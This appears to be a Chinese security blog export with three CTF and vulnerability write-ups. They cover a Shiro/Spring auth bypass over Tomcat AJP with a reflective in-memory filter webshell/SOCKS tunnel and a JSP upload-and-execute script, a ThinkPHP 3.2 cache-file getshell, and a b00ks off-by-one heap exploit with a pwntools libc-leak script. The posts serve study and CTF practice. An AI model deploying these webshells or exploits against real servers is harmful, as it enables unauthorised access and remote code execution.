无文件socks5代理因为这里是shiro，shiro本身也是一个filter，所以内存马最好也搞成filter(优先级最高)，内存马的思路可以看基于Tomcat无文件Webshell研究。至于具体filter的逻辑，改一下reg就好了，下面贴一下leixiao师傅的代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138package reGeorg;import javax.servlet.*;import java.io.IOException;public class MemReGeorg implements javax.servlet.Filter{ private javax.servlet.http.HttpServletRequest request = null; private org.apache.catalina.connector.Response response = null; private javax.servlet.http.HttpSession session =null; @Override public void init(FilterConfig filterConfig) throws ServletException { } public void destroy() {} @Override public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException { javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1; javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1; javax.servlet.http.HttpSession session = request.getSession(); String cmd = request.getHeader(\"X-CMD\"); if (cmd != null) { response.setHeader(\"X-STATUS\", \"OK\"); if (cmd.compareTo(\"CONNECT\") == 0) { try { String target = request.getHeader(\"X-TARGET\"); int port = Integer.parseInt(request.getHeader(\"X-PORT\")); java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open(); socketChannel.connect(new java.net.InetSocketAddress(target, port)); socketChannel.configureBlocking(false); session.setAttribute(\"socket\", socketChannel); response.setHeader(\"X-STATUS\", \"OK\"); } catch (java.net.UnknownHostException e) { response.setHeader(\"X-ERROR\", e.getMessage()); response.setHeader(\"X-STATUS\", \"FAIL\"); } catch (java.io.IOException e) { response.setHeader(\"X-ERROR\", e.getMessage()); response.setHeader(\"X-STATUS\", \"FAIL\"); } } else if (cmd.compareTo(\"DISCONNECT\") == 0) { java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(\"socket\"); try{ socketChannel.socket().close(); } catch (Exception ex) { } session.invalidate(); } else if (cmd.compareTo(\"READ\") == 0){ java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(\"socket\"); try { java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(512); int bytesRead = socketChannel.read(buf); ServletOutputStream so = response.getOutputStream(); while (bytesRead &gt; 0){ so.write(buf.array(),0,bytesRead); so.flush(); buf.clear(); bytesRead = socketChannel.read(buf); } response.setHeader(\"X-STATUS\", \"OK\"); so.flush(); so.close(); } catch (Exception e) { response.setHeader(\"X-ERROR\", e.getMessage()); response.setHeader(\"X-STATUS\", \"FAIL\"); } } else if (cmd.compareTo(\"FORWARD\") == 0){ java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(\"socket\"); try { int readlen = request.getContentLength(); byte[] buff = new byte[readlen]; request.getInputStream().read(buff, 0, readlen); java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen); buf.clear(); buf.put(buff); buf.flip(); while(buf.hasRemaining()) { socketChannel.write(buf); } response.setHeader(\"X-STATUS\", \"OK\"); } catch (Exception e) { response.setHeader(\"X-ERROR\", e.getMessage()); response.setHeader(\"X-STATUS\", \"FAIL\"); socketChannel.socket().close(); } } } else { filterChain.doFilter(request, response); } } public boolean equals(Object obj) { Object[] context=(Object[]) obj; this.session = (javax.servlet.http.HttpSession ) context[2]; this.response = (org.apache.catalina.connector.Response) context[1]; this.request = (javax.servlet.http.HttpServletRequest) context[0]; try { dynamicAddFilter(new MemReGeorg(),\"reGeorg\",\"/*\",request); } catch (IllegalAccessException e) { e.printStackTrace(); } return true; } public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException { javax.servlet.ServletContext servletContext=request.getServletContext(); if (servletContext.getFilterRegistration(name) == null) { java.lang.reflect.Field contextField = null; org.apache.catalina.core.ApplicationContext applicationContext =null; org.apache.catalina.core.StandardContext standardContext=null; java.lang.reflect.Field stateField=null; javax.servlet.FilterRegistration.Dynamic filterRegistration =null; try { contextField=servletContext.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext); contextField=applicationContext.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext); stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP); filterRegistration = servletContext.addFilter(name, filter); filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url}); java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext, null); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); }catch (Exception e){ ; }finally { stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } } }} ajp越权的shiro acl这一点后面的提示也给出来了，可以用how-to-detect-tomcat-ajp-lfi-more-accurately提到的办法，也可以用我之前提交的SHIRO-760。poc在issue里面已经给了，漏洞的demo环境在我github上可以找到，这里借这个机会分享一下当时挖掘的思路。 通过分析前人的文章可以知道，我们可以知道在org.apache.shiro.web.util.WebUtils#getPathWithinApplication内部会对requestUri进行提取并交给patchMatches匹配以判断是否需要鉴权。多次步入后，可以看到具体的获取uri的实现是其中的getRequestUri。getRequestUri首先会获取javax.servlet.include.request_uri的值如果获取到了就不会进入 if (uri == null) 。而如果有师傅看过shiro上一次对越权的修复的话会发现，补丁是打在if (uri == null)中的，通过ajp控制javax.servlet.include.request_uri相当于绕过上一次的补丁点。接着这里提取出来的uri/;/admin/page会进入decodeAndCleanUriString中进行清洗。decodeAndCleanUriString会取分号前的内容返回。在这里返回的就是/，后面shiro的正则/admin/*自然也就拦截不了。 此外，光绕过shiro还不行，spring不解析这条路由也没用，一个开始我也为用前人文章中的 /xxxx;/../ 可以轻松绕过，黑盒发现并不行。分析ajp漏洞的时候我们知道，tomcat先调用对所有filter进行过滤然后会调用对应的servlet，而在spring都是统一由DispatcherServlet进行统一调度的。所以一开始我选择把断点打到org.springframework.web.servlet.FrameworkServlet#doGet（_DispatcherServlet继承FrameworkServlet_）。又因为spring是通过HandlerMapping来找对应的控制器，所以步入断点之后就开始找哪个地方有这个逻辑。最后在/org/springframework/web/servlet/DispatcherServlet.class:484找到。步入之后spring把已经注册过Mapping轮询一次。在代码中我们用的@GetMapping这里就对应ReuqestMappingHandlerMapping。步入ReuqestMappingHandlerMapping之后再多次步入，最后来到org.springframework.web.util.UrlPathHelper#getPathWithinApplication这里三个箭头是关键的三个点，第一个箭头会对uri提取并“消杀”，第二个箭头会去pathWithinApp中servletPath之后的内容。第三个箭头返回path交给HandlerMapping匹配。 我们先来看第一个箭头“消杀”的步骤。上图removeSemicolonContent会移除uri中;，/;/admin/page变为//admin/page。getSanitizedPath会对移除重复的/， //admin/page 变为 /admin/page （_ps：这里并不会处理..及.这也是为啥老payload /xxx;/../无法用的原因，虽然可以绕过但是之后spring handlerMapping匹配不到。_） 再来第二个箭头，这个getRemainingPath会提取处Uri中conextPath之后的部分。举个反例如果我们把javax.servlet.include.servlet_path设置为/，那么返回给HandlerMapping将会是 admin/page ，而HandlerMapping只会匹配/admin/page这也是为什么javax.servlet.include.servlet_path需要置为空的原因。 回过头看漏洞本质还是在于spring和shiro在规范消杀url时标准不一致造成的问题。因为最新版的tomcat已经默认把ajp关了，并且在反代情况下tomcat 8009也不会对外开放所以这个洞的利用还是受很大限制的。 ajp上传文件因为网上ajp协议讨论较少，和exp有关的只有CVE-2020-1938，不过payload的构造比较单一并不涉及到上传文件的请求，网上应该也没有介绍相关的文章。那要怎么通过ajp传？我预想的思路是选手通过阅读相关类库来解决比如AJPy，在tomcat.py中提供了一种部署war包getshell的操作，这里面就有上传文件的操作，可以借鉴。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import sysimport osfrom io import BytesIOfrom ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundExceptionfrom tomcat import Tomcattarget_host = \"127.0.0.1\"gc = Tomcat(target_host, 8009)filename = \"shell.jpg\"payload = \"&lt;% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\\\"cat /flag.txt\\\").getInputStream())).readLine()); %&gt;\"with open(\"/tmp/request\", \"w+b\") as f: s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n' % filename s_form_footer = '\\r\\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\\r\\n' f.write(s_form_header.encode('utf-8')) f.write(payload.encode('utf-8')) f.write(s_form_footer.encode('utf-8'))data_len = os.path.getsize(\"/tmp/request\")headers = { \"SC_REQ_CONTENT_TYPE\": \"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti\", \"SC_REQ_CONTENT_LENGTH\": \"%d\" % data_len,}attributes = [ { \"name\": \"req_attribute\" , \"value\": (\"javax.servlet.include.request_uri\", \"/;/admin/upload\", ) } , { \"name\": \"req_attribute\" , \"value\": (\"javax.servlet.include.path_info\", \"/\", ) } , { \"name\": \"req_attribute\" , \"value\": (\"javax.servlet.include.servlet_path\", \"\", ) }, ]hdrs, data = gc.perform_request(\"/\", headers=headers, method=\"POST\", attributes=attributes)with open(\"/tmp/request\", \"rb\") as f: br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER) responses = br.send_and_receive(gc.socket, gc.stream)r = AjpResponse()r.parse(gc.stream)shell_path = r.data.decode('utf-8').strip('\\x00').split('/')[-1]print(\"=\"*50)print(shell_path)print(\"=\"*50)gc = Tomcat('127.0.0.1', 8009)attributes = [ {\"name\": \"req_attribute\", \"value\": (\"javax.servlet.include.request_uri\", \"/\",)}, {\"name\": \"req_attribute\", \"value\": (\"javax.servlet.include.path_info\", shell_path,)}, {\"name\": \"req_attribute\", \"value\": (\"javax.servlet.include.servlet_path\", \"/\",)},]hdrs, data = gc.perform_request(\"/uploads/1.jsp\", attributes=attributes)output = sys.stdoutfor d in data: try: output.write(d.data.decode('utf8')) except UnicodeDecodeError: output.write(repr(d.data))","link":"/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"title":"TP框架3.2缓存漏洞","text":"何为缓存？具体http://www.thinkphp.cn/code/1579.html 简单的说就是减少服务器压力，将用户常见的的网页事先静态存储好。个人认为，一般情况下TP用的是数据缓存，即将数据缓存到一个php文件中，文件名包含一个id来唯一标示（TP中是一个md5值） 搭建环境配置数据库12345CREATE database articleCREATE TABLE article (content VARCHAR(255));'DB_NAME' =&gt; 'aritcle' -- 在config.php中添加该键值对 写入代码修改home/controller/indexController.class.php 如下 123456789101112131415161718&lt;?phpnamespace Home\\Controller;class IndexController { function index(){ echo \"welcome\"; } function save(){ $content = array('content' =&gt; I('get.content')); $amodel = M('article'); $amodel-&gt;data($content)-&gt;add(); } function cache(){ $amodel = M('article'); $content = $amodel-&gt;select(); var_dump($content); S('content',$content,3600); }} 缓存函数用法在TP3.2版本中，起缓存功能的是S函数，用法如下 123456// 使用data标识缓存$Data数据S('data',$Data); //前面的是缓存标示，后面的是缓存的数据// 缓存$Data数据3600秒S('data',$Data,3600);// 删除缓存数据S('data',NULL); //第一个参数时缓存的标识名 下面为第一次创建缓存（理想情况下）的代码跟踪跟进S函数 12345678910111213141516171819202122/** * 缓存管理 * @param mixed $name 缓存名称，如果为数组表示进行缓存设置 * @param mixed $value 缓存值 * @param mixed $options 缓存参数 * @return mixed */function S($name,$value='',$options=null) { static $cache = ''; /*省略*/ }elseif(empty($cache)) { // 自动初始化 $cache = Think\\Cache::getInstance();//创建缓存时从这里进入 } if(''=== $value){ // 获取缓存 return $cache-&gt;get($name); }elseif(is_null($value)) { // 删除缓存 return $cache-&gt;rm($name); }else { // 缓存数据 /*省略*/ return $cache-&gt;set($name, $value, $expire); }} 创建缓存时进入Think\\Cache::getInstance()，这个方法检索静态数组是否已经有缓存实例，如果有就返回，没有则创建。 123456789101112131415/** * 取得缓存类实例 * @static * @access public * @return mixed */static function getInstance($type='',$options=array()) { static $_instance = array();//静态变量，储存所有创建的缓存实例 $guid = $type.to_guid_string($options);//返回一个md5编号，以待稍后作为数组键值 if(!isset($_instance[$guid])){//如果缓存实例不存在则创建 $obj = new Cache(); $_instance[$guid] = $obj-&gt;connect($type,$options); } return $_instance[$guid];} md5标识号生成方式 123456789101112/** * 根据PHP各种类型变量生成唯一标识号 * @param mixed $mix 变量 * @return string */function to_guid_string($mix) { /*省略*/ } else { $mix = serialize($mix); } return md5($mix);//返回一个序列化的md5值} 跟进$obj-&gt;connect($type,$options);这个方法是在配置一些初始值，比如缓存的类型，路径信息 1234567891011121314151617/** * 连接缓存 * @access public * @param string $type 缓存类型 * @param array $options 配置数组 * @return object */public function connect($type='',$options=array()) { if(empty($type)) $type = C('DATA_CACHE_TYPE');//如果为$type空，默认缓存类型为FILE $class = strpos($type,'\\\\')? $type : 'Think\\\\Cache\\\\Driver\\\\'.ucwords(strtolower($type)); if(class_exists($class)) $cache = new $class($options); // 实例化Think\\Cache\\Driver\\FILE else E(L('_CACHE_TYPE_INVALID_').':'.$type); return $cache;} 最后一步写入缓存 123456789101112131415161718/** * 写入缓存 * @access public * @param string $name 缓存变量名 * @param mixed $value 存储数据 * @param int $expire 有效时间 0为永久 * @return boolean */public function set($name,$value,$expire=null) { /*省略*/ $filename = $this-&gt;filename($name);//生成文件名，理想情况下MD5('content') /*省略*/ $data = serialize($value); /*省略*/ $data = \"&lt;?php\\n//\".sprintf('%012d',$expire).$check.$data.\"\\n?&gt;\"; $result = file_put_contents($filename,$data); /*省略*/} 关键点在&lt;?php\\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\\n?&gt; 理想情况下这里的利用条件得天独厚，因为两个尖括号都写好了，不用担心I函数过滤的问题。而其中的data就是传入进去的一句话： 在Runtime/Temp下 getshell 最后文中一直提到是理想情况，这里解释一下，跟踪的时候省略了一些代码，其中有的是利用的前提条件，举个例子，文中提到理想情况下webshell文件名是MD5(‘content’)即9a0364b9e99bb480dd25e1f0284c8555/原因是TP中有一个给MD5值加盐的参数可以在配置文件中申明DATA_CACHE_KEY，如果管理员事先设置了这个参数，文件名就会变得不可猜，具体如下 还有一些前提条件，例如Runtime不在web目录内，一般情况也是利用不了的。 如何出错，恳请指点","link":"/2017/08/20/TP%E6%A1%86%E6%9E%B63.2%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"},{"title":"PWN 堆利用 off-by-one NULL byte - b00ks writeup","text":"最新刚开始学pwn，还不熟悉ida和gdb。此篇记录了off-by-one b00ks上这道题的复现，从ida/gdb使用到payload编写。文中有一些内存分布图片偷懒我没有自己画，引用自这篇文章（写的很好）。侵删。 基本信息检查 程序入口点分析静态方法拿到程序入口 动态方法 start 功能：start命令用于加载程序并在程序的 main 函数的第一条语句之前设置一个临时断点。代码会执行到 main 函数启动之前，然后暂停，让你可以进行调试设置。 典型场景：start命令通常用于希望程序在还没有开始主要逻辑之前能暂停下来，让调试者有机会设置其他断点或检查初始状态。 入口指令恢复 这里看到IDA有一个错误的反编译，它把代码搞成了数据，选中这一段用 Undefine（快捷键 U），它会取消对该区域的数据显示。 在取消定义后，右键点击同一区域。选择 Code（快捷键 C），这将告诉 IDA Pro 重新识别该区域为代码。 右键点击选择 Code 或按 C 键，选force，重新将选中的区域转换为代码。 确定main函数根据LIBC_START_MAIN的函数原型我们可以知道，第一个参数是main函数的地址 -&gt; cs:11CFh 123456789101112//glibc-2.24 ./csu/libc-start.cSTATIC int LIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL), int argc, char **argv,#ifdef LIBC_START_MAIN_AUXVEC_ARG ElfW(auxv_t) *auxvec,#endif __typeof (main) init, void (*fini) (void), void (*rtld_fini) (void), void *stack_end) 由此找到main函数 在光标位于 011CF 地址上时，按下快捷键 N，会弹出一个对话框。输入 main 并确认。 代码阅读与函数名恢复 banner(sub_A77)我们一个一个来看，sub_A77输出banner信息，重命名为banner edit_author_name(sub_B6D)需要用户输入author name，重命名为edit_author_name create_book(sub_F55)sub_F55是在创建书，重命名为create book delete_book(sub_BBD)sub_BBD是在删除书，重命名为delete_book edit_book(sub_E17)sub_E17在修改book, edit_book list_book(sub_D1F)在输出所有书籍信息, list_book menu(sub_A89)sub_A89给出了选项，根据用户不同输出跳转到上面的各个子功能。重命名为menu 最后main被润色成如下 细读子功能 create_book用户先输入一个size，然后malloc指定用户输入的size的大小 123456789101112131415161718signed __int64 sub_F55(){ int v1; // [rsp-28h] [rbp-28h] int v2; // [rsp-24h] [rbp-24h] _DWORD *v3; // [rsp-20h] [rbp-20h] _BYTE *v4; // [rsp-18h] [rbp-18h] _BYTE *v5; // [rsp-10h] [rbp-10h] v1 = 0; printf(\"\\nEnter book name size: \", *(_QWORD *)&amp;v1); __isoc99_scanf(\"%d\", &amp;v1); if ( v1 &gt;= 0 ) { printf(\"Enter book name (Max 32 chars): \", &amp;v1); v4 = malloc(v1); if ( v4 ) { if ( (unsigned int)sub_9F5(v4, v1 - 1) ) 接着调用sub_9F5，让我们细看一下sub_9F5的作用，这里它循环读取用户输入内容并且赋值给刚才malloc的那块内存。 123456789101112131415161718192021signed __int64 __fastcall sub_9F5(_BYTE *a1, int a2){ int i; // [rsp-14h] [rbp-14h] _BYTE *v4; // [rsp-10h] [rbp-10h] if ( a2 &lt;= 0 ) return 0LL; v4 = a1; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, v4, 1uLL) != 1 ) return 1LL; if ( *v4 == 10 ) break; ++v4; if ( i == a2 ) break; } *v4 = 0; return 0LL;} 我们重名为scan_user_input。举个例子如果用户输入32, 那么就会调用scan_user_input(v4, 31)。scan_user_input内部循环从0读到31并且在第32位添加0，注意这里其实是一个 off -by-one NULL byte问题，用户申请32的空间，实际写入了33个字符。 如果一切回继续进入else部分 1234567891011121314151617181920212223else{ v2 = sub_B24(); if ( v2 == -1 ) { printf(\"Library is full\"); } else { v3 = malloc(0x20uLL); if ( v3 ) { v3[6] = v1; *((_QWORD *)off_202010 + v2) = v3; *((_QWORD *)v3 + 2) = v5; *((_QWORD *)v3 + 1) = v4; *v3 = ++unk_202024; return 0LL; } printf(\"Unable to allocate book struct\"); }} 调用sub_B24 123456789101112signed __int64 sub_B24(){ __int64 v1; // [rsp-8h] [rbp-8h] *((_DWORD *)&amp;v1 - 1) = 0; for ( *((_DWORD *)&amp;v1 - 1) = 0; *((_DWORD *)&amp;v1 - 1) &lt;= 19; ++*((_DWORD *)&amp;v1 - 1) ) { if ( !*((_QWORD *)off_202010 + *((signed int *)&amp;v1 - 1)) ) return *((unsigned int *)&amp;v1 - 1); } return 0xFFFFFFFFLL;} 结合后面*((_QWORD *)off_202010 + v2) = v3分析，off_202010其实是一个数组（书柜）用来放置book对象的指针，循环遍历这个数字，如果数组对应下标为空，那么说明书柜有空位，返回对应下标，否则返回-1（-1的反码为0xFFFFFFFFLL）把sub_B24命名为check_space。 一旦有space就会给book对象malloc一个空间，稍微美化一下，容易看出在源码中book应该是一个结构体 1234567891011book = malloc(0x20uLL);if ( book ){ book[6] = desc_size; *((_QWORD *)bookshelf + idx) = book; *((_QWORD *)book + 2) = book_desc; *((_QWORD *)book + 1) = book_name; *book = ++unk_202024; return 0LL;}printf(\"Unable to allocate book struct\"); 不过这里反编译的仍然很混乱，unk_202024应该是一个int, book + 1, book + 2应该是两个8字节的指针，为什么放size的时候突然发到book[6]了？book这里一个item的大小究竟是多少？ 我们回到这部分汇编再看一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:00000000000010FA.text:00000000000010FA loc_10FA: ; CODE XREF: create_book+18D↑j.text:00000000000010FA mov edi, 20h ; ' ' ; size.text:00000000000010FF call _malloc.text:0000000000001104 mov [rbp-18h], rax.text:0000000000001108 cmp qword ptr [rbp-18h], 0.text:000000000000110D jnz short loc_1122.text:000000000000110F lea rdi, large cs:1618h ; \"Unable to allocate book struct\".text:0000000000001116 mov eax, 0.text:000000000000111B call _printf.text:0000000000001120 jmp short loc_118F.text:0000000000001122 ; ---------------------------------------------------------------------------.text:0000000000001122.text:0000000000001122 loc_1122: ; CODE XREF: create_book+1B8↑j.text:0000000000001122 mov eax, [rbp-20h] //这里里面放的是desc size的值.text:0000000000001125 mov edx, eax.text:0000000000001127 mov rax, [rbp-18h] //rax放置book对象指针地址.text:000000000000112B mov [rax+18h], edx //把edx赋值给book对象的第一个值，这个值是一个4字节的值.text:000000000000112E lea rax, bookshelf //把存放bookshelf数组地址的那个地址传入.text:0000000000001135 mov rax, [rax] //拿到bookshelf数组的起始地址.text:0000000000001138 mov edx, [rbp-1Ch] //把idx放到edx里面.text:000000000000113B movsxd rdx, edx //把idx字节的值保留符号扩展到8字节.text:000000000000113E shl rdx, 3 //把idx右移动3位相当于idx * 8 -&gt; 移动到指针的距离.text:0000000000001142 add rdx, rax //rdx = bookshelf + idx * 8.text:0000000000001145 mov rax, [rbp-18h] //rax = book地址.text:0000000000001149 mov [rdx], rax //[bookshelf + idx * 8] = book地址.text:000000000000114C mov rax, [rbp-18h] //rax = book地址.text:0000000000001150 mov rdx, [rbp-8] //这里放的是desc指针.text:0000000000001154 mov [rax+10h], rdx //[book+0x10] = desc指针.text:0000000000001158 mov rax, [rbp-18h] //rax放置book对象指针地址.text:000000000000115C mov rdx, [rbp-10h] //[rbp-10h]的值name的指针.text:0000000000001160 mov [rax+8], rdx //[book + 0x8] = name的指针.text:0000000000001164 lea rax, unk_202024 // rax = unk_202024.text:000000000000116B mov eax, [rax] // eax = [unk_202024].text:000000000000116D lea edx, [rax+1] // edx = [unk_202024] + 1.text:0000000000001170 lea rax, unk_202024 // rax = [unk_202024].text:0000000000001177 mov [rax], edx // [unk_202024] = [unk_202024] + 1.text:0000000000001179 lea rax, unk_202024 // rax = unk_202024.text:0000000000001180 mov edx, [rax] // edx = [unk_202024].text:0000000000001182 mov rax, [rbp-18h] // rax = book.text:0000000000001186 mov [rax], edx //*book = 4字节宽度的 unk_202024.text:0000000000001188 mov eax, 0 .text:000000000000118D jmp short locret_11CD.text:000000000000118F ; ---------------------------------------- 综上 1234book + 0x18h = desc_sziebook + 0x8h = name指针book + 0x10h = desc 指针book + 0x0h = int number 可见ida的反汇编结果不太准确。book结构体正确的偏移应该是。 12340-4 int8-16 ptr16-24 ptr24-28 int 123456struct book { int id; char *name; //因为对齐会占到8 char *description; int description_size;} book; 在ida中创建结构体 这下就对味了, malloc完堆布局如下。 细说利用 (泄漏libc地址)bookshelf数组里面放着第一个book的指针 (0x0000555555603710) Bookshelf和off_202018(author name相邻) 1234.data:0000000000202010 bookshelf dq offset unk_202060 ; DATA XREF: check_space:loc_B38↑o.data:0000000000202010 ; delete_book:loc_C1B↑o ....data:0000000000202018 off_202018 dq offset unk_202040 ; DATA XREF: edit_author_name+15↑o.data:0000000000202018 ; list_book+CA↑o 12345678910111213141516gef➤ heap chunksChunk(addr=0x555555603010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x0000555555603010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................]Chunk(addr=0x5555556032a0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x00005555556032a0 33 32 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 32..............]Chunk(addr=0x5555556036b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x00005555556036b0 61 61 61 61 61 61 61 61 61 61 00 00 00 00 00 00 aaaaaaaaaa......]Chunk(addr=0x5555556036e0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x00005555556036e0 62 62 62 62 62 62 62 62 62 62 00 00 00 00 00 00 bbbbbbbbbb......]Chunk(addr=0x555555603710, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x0000555555603710 01 00 00 00 00 00 00 00 b0 36 60 55 55 55 00 00 .........6`UUU..]Chunk(addr=0x555555603740, size=0x208d0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) ← top chunkgef➤ x /1xg 0x5555556020100x555555602010: 0x0000555555602060gef➤ x /2xg 0x00005555556020600x555555602060: 0x0000555555603710 0x0000000000000000 可以利用off-by-one把bookshelf的第一个指针最后一位覆盖为\\x00。 如果我们可以把bookshelf抬高到上面description的位置，那么我们就可以提前在descripton里面伪造好book结构体的数据。 然后触发edit book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址写的目的。 然后触发list book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址读的目的。 这里需要倒推一下，不考虑地址随机化(ASLR)的话，malloc第一个book的name时，堆顶是0x5555556036b0 - 0x8（从prev_size开始算） 不考虑ASLR如果name malloc 64字节，desc malloc 32字节。那么实际上book ptr的地址会是 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10 = 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10 = 0x5555556036b0 + 0x50 + 0x30 = 0x555555603730 0x555555603730置0成0x555555603700刚好就是book1 description的地址。 更通行通法的来讲，应该再下面这个约束里面找一个解就行了。 123addr = 0x5555556036b0 - 0x10 + request2size(X) + request2size(Y) + 0x10(addr &amp; ~(0x100 - 0x1)) == 0x5555556036b0 - 0x10 + request2size(X) + 0x10request2size(Y) &gt;= size(book) 12345678910111213141516SIZE_SZ = 8 # 64位系统上 size_t 的大小 MALLOC_ALIGN_MASK = 15 # 16字节对齐掩码 (0xF) MINSIZE = 32 # 假设的最小块大小 def request2size(req): if req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE: return MINSIZE else: return (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK for X in range(0, 65): for Y in range(0, 65): addr = 0x5555556036b0 - 0x10 + request2size(X) + request2size(Y) + 0x10 if( (addr &amp; ~(0x100 - 0x1)) == 0x5555556036b0 - 0x10 + request2size(X) + 0x10 and request2size(Y) &gt;= 28): print(X, Y) 可以跑出来很多结果，我们随便挑一对验证。比如（57, 10）-&gt; 其实在后面还会发现第二个为了放payload还是需要更长一点。 0x555555603720 -&gt; addr=0x555555603700回到description PS: 看起来这个题目我目前只malloc了小内存块不超过0x1000所以没有跨内存页的问题，如果heap地址在ASLR的情况下其实地址按0x1000对齐也不影响？ 现在已经知道可以读写任意地址了，但是这个题开了ASLR仍然不是知道libc的基地址。在PWN里面知道基地址是非常核心的一步，因为后面无论是覆盖free_hook或者别的地址，又或是找onegadget都需要它。 这里泄漏的基地址方法是在book中使用非常大的size迫使malloc使用mmap来分配内存， mmap分配的内存和libc基地址有一个固定偏移 。我们只需要在book1中description字段构造一个fake book让他指向book2的description或者name之一就能再调用list book就能泄漏mmap地址进而通过固定地址偏移计算出libc地址。 至于为什么有这个所谓的“固定偏移”，我看网上的wp都是一笔带过（no offence）。 翻了一点kernel源码看，基本搞懂了原理，写在下面附 固定地址原理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *context(arch='x86', os='linux', log_level='debug')binary_path = '/home/parallels/Desktop/b00ks' io = process(binary_path)pwnlib.gdb.attach(proc.pidof(io)[0])io.recvuntil('Enter author name:')io.sendline('a' * 32)# add book 1io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('64')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object1')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('object1')##print Authorio.recvuntil('&gt;')io.sendline('4')io.recvuntil('Author:')io.recvuntil('a'*32)book1_addr = io.recv(6)book1_addr = book1_addr.ljust(8, b'\\x00')book1_addr = u64(book1_addr)print(\"The first idx in bookshelf: \" + hex(book1_addr))#edit book1io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')fake_book_data = p64(0x1) + p64(book1_addr + 0x30 + 4 + 4 ) + p64(book1_addr + 0x30 + 4 + 4 + 8) + p64(0xffff)io.sendline(fake_book_data)#off-by-oneio.recvuntil('&gt;')io.sendline('5')io.recvuntil('Enter author name:')io.sendline('a' * 32)#pause()#add book2io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline(str(128*1024))io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object2')io.recvuntil('Enter book description size:')io.sendline(str(128*1024))io.recvuntil('Enter book description:')io.sendline('object2')#pause()##print Authorio.recvuntil('&gt;')io.sendline('4')# io.recvuntil('Name: ')# io.recvuntil('Description: ')io.recvuntil('Name: ')name_mmap_addr = io.recv(6)name_mmap_addr = name_mmap_addr.ljust(8, b'\\x00')io.recvuntil('Description: ')desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(\"name_mmap_addr : \" + hex(u64(name_mmap_addr)))print(\"desc_mmap_addr : \" + hex(u64(desc_mmap_addr))) 这里还有一个小困惑，为什么libc-2.31.so被加载进来了这多次。 